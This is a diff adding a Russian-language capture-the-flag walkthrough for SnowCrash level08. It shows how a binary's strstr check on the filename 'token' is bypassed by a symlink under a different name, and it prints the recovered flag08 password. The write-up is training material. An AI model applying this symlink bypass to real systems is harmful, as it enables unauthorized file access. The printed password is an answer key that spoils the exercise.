@@ -1,0 +1,41 @@
+в домашний деректории лежит исполняймый файл level08 и token
+При запуске level08 пишет что требуется аргумент 
+```
+./level08 [file to read]
+```
+Если подкинуть ему token то пишет:
+```
+You may not access 'token'
+```
+Попробуем подкинуть ему другой файл
+```
+level08@SnowCrash:~$ echo test > /tmp/test && ./level08 /tmp/test
+test
+```
+Увидим что происходит печать то что находится в файле
+Создадим файловую ссылку на token в /tmp/test
+```
+ln -s $(pwd)/token /tmp/token
+```
+Подадим leve08 /tmp/token
+```
+level08@SnowCrash:~$ ./level08 /tmp/token
+You may not access '/tmp/token'
+```
+Посмотрим ltrace ./level08 /tmp/token и увидим что идет проверка на вхождение в строку строки token
+```
+__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
+strstr("/tmp/token", "token")                                                                                 = "token"
+printf("You may not access '%s'\n", "/tmp/token"You may not access '/tmp/token'
+)                                                             = 32
+exit(1 <unfinished ...>
++++ exited (status 1) +++
+```
+Поменяем имя ссылки и запустим заново
+```
+mv /tmp/token /tmp/getflag && ./level08 /tmp/getflag
+```
+и получим пароль от flag08
+```
+quif5eloekouj29ke0vouxean
+```
